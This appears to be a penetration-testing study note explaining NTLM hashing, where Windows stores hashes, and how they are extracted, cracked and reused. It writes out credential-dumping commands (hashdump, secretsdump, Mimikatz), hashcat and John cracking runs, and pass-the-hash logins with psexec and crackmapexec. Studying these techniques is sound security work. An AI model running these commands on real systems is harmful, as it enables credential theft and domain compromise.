---
title: "NTLM"
created: 2026-03-11
type: concept
tags: [concept, hashing, windows, authentication]
---

# NTLM

**NT LAN Manager** — Windows authentication protocol that stores password hashes and handles network authentication. The "NTLM hash" (also called NT hash) is the format Windows uses to store local account passwords.

---

## How NTLM Hashing Works

1. Take the password in Unicode (UTF-16LE)
2. Hash it with MD4
3. Result: 32 hex characters (128 bits)

No salt. Same password = same hash on every Windows machine. This makes NTLM hashes vulnerable to rainbow tables and fast cracking (billions/sec on GPU).

---

## Where NTLM Hashes Live

| Location | Description | How to Extract |
|----------|-------------|---------------|
| **SAM database** | Local account hashes (`C:\Windows\System32\config\SAM`) | `hashdump` in Meterpreter, `secretsdump.py`, boot from live USB |
| **NTDS.dit** | Domain controller — all AD account hashes | `secretsdump.py`, `ntdsutil`, DCSync attack |
| **LSASS memory** | Cached credentials in running memory | Mimikatz `sekurlsa::logonpasswords`, `procdump` + offline extraction |

### Meterpreter

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

The format is `user:RID:LM_hash:NT_hash:::`. The LM hash (`aad3b...`) is usually disabled (blank placeholder). The NT hash is the one you crack.

### Impacket secretsdump

```bash
secretsdump.py -just-dc-ntlm domain/admin:password@dc_ip
```

---

## NTLMv1 vs NTLMv2

| | NTLMv1 | NTLMv2 |
|---|--------|--------|
| **Challenge-response** | DES-based, weaker | HMAC-MD5, stronger |
| **Cracking difficulty** | Easier | Harder |
| **Modern Windows** | Disabled by default | Default |

Both use the NT hash as the base secret. The "v1" and "v2" refer to the **network authentication protocol**, not the hash storage format.

---

## Cracking NTLM Hashes

```bash
# Hashcat
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

NTLM is extremely fast to crack — no salt, MD4-based. A GPU tests billions per second.

---

## Pass-the-Hash

You don't always need to crack the hash. With the NT hash itself, you can authenticate directly:

```bash
# Impacket psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117 admin@target

# CrackMapExec
crackmapexec smb target -u admin -H 8846f7eaee8fb117
```

This works because NTLM authentication uses the hash as the key — the server never sees the actual password.

---

## Related Notes

- [[Password Hashing]] — algorithm comparison, why NTLM is weak
- [[Hashcat]] / [[John Basics]] — cracking tools
- [[hashdump]] — extracting hashes via Meterpreter
- [[Kerberos]] — newer Windows authentication (replaces NTLM in AD)
